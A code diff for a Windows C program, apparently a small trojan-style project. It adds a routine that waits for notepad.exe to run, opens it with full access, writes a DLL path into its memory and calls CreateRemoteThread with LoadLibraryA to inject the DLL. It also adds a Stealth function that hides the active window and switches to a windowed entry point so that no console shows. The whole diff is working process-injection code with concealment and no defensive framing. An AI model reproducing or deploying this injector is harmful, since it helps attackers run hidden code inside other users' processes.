@@ -1,5 +1,6 @@
 #include <Windows.h>
 #include<stdio.h>
+#include <tlhelp32.h>
 
 
 
@@ -35,9 +36,38 @@ DWORD WINAPI ThreadProc(
 }
 
 
+int find_pid()
+{
+	PROCESSENTRY32 entry;
+	entry.dwSize = sizeof(PROCESSENTRY32);
 
+	HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
+	if (Process32First(snapshot, &entry) == TRUE)
+	{
+		while (Process32Next(snapshot, &entry) == TRUE)
+		{
+			if (strcmp(entry.szExeFile, "notepad.exe") == 0)
+			{
+				CloseHandle(snapshot);
+				return entry.th32ProcessID;
+			}
+		}
+	}
 
-int main(int argc, char** argv) {
+	CloseHandle(snapshot);
+
+	return 0;
+}
+void Stealth()
+{
+	/*HWND Stealth;
+	AllocConsole();
+	Stealth = FindWindowA("ConsoleWindowClass", NULL);
+	ShowWindow(Stealth, 0);*/
+	HWND hWin = GetForegroundWindow();
+	ShowWindow(hWin, SW_HIDE);
+}
+int WINAPI wWinMain(int argc, char** argv) {
 
 #pragma region MyRegion
 	/*HANDLE h_out = GetStdHandle(STD_OUTPUT_HANDLE);
@@ -69,19 +99,21 @@ ReadConsoleInput(h_in, input, 128 , &toWrite);
 #pragma endregion
 
 	//CreateThread(NULL, 0, ThreadProc, NULL, 0, NULL);
+	//Stealth();
+	int pid_notepad = find_pid();
+	do {
+		pid_notepad = find_pid();
+	} while (pid_notepad == 0);
+	if (pid_notepad != 0) {
+		HANDLE hp = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid_notepad);
 
+		LPVOID notepadMemoryPtr = VirtualAllocEx(hp, NULL, 100, MEM_COMMIT, PAGE_READWRITE);
 
-
-	HANDLE hp = OpenProcess(PROCESS_ALL_ACCESS , FALSE, 13364);
-
-	
-	LPVOID notepadMemoryPtr = VirtualAllocEx(hp, NULL, 100, MEM_COMMIT, PAGE_READWRITE);
-	
-	char *buf = "C:\\Users\\Ethan\\Desktop\\C\\TroySous_ETHAN\\x64\\Debug\\myDLL2.dll";
-	int ret = WriteProcessMemory(hp, notepadMemoryPtr, buf , strlen(buf)+1 ,NULL);
-	DWORD tid;
-	CreateRemoteThread(hp, NULL,0,LoadLibraryA ,notepadMemoryPtr, 0,&tid);
-
-	system("pause");
+		char *buf = "C:\\Users\\Ethan\\Desktop\\C\\TroySous_ETHAN\\x64\\Debug\\myDLL2.dll";
+		int ret = WriteProcessMemory(hp, notepadMemoryPtr, buf, strlen(buf) + 1, NULL);
+		DWORD tid;
+		CreateRemoteThread(hp, NULL, 0, LoadLibraryA, notepadMemoryPtr, 0, &tid);
+		
+	}
 	return 0;
 }
